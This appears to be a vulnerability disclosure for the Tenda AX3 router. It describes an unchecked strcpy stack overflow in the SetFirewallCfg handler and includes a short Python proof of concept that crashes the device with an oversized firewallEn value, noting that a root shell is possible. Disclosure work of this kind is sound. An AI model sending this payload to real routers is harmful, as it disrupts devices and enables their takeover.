# Tenda AX3 V16.03.12.11 Stack overflow vulnerability

## Firmware information

- Manufacturer's address：https://www.tenda.com.cn/
- Firmware download address ：https://www.tenda.com.cn/download/detail-3476.html

## Affected version

![](https://github.com/hujianjie123/vuln/blob/main/Tenda/SetFirewallCfg/img/1.png)

## Vulnerability details

![](https://github.com/hujianjie123/vuln/blob/main/Tenda/SetFirewallCfg/img/2.png)

In /goform/SetFirewallCfg, The user can input firewallEn data into var. When the data entered by the user is greater than 3, the user input data will be strcpyed into the variable firewall_buf. It is worth noting that there is no size detection, resulting in stack overflow.

## Poc

```python
import requests

url = "http://192.168.0.1/goform/SetFirewallCfg"

firewallEn = "a" * 0x20000

r = requests.post(url, data={'firewallEn': firewallEn})
print(r.content)
```

Then you can see the router crash, and finally you can write exp to get rootshell
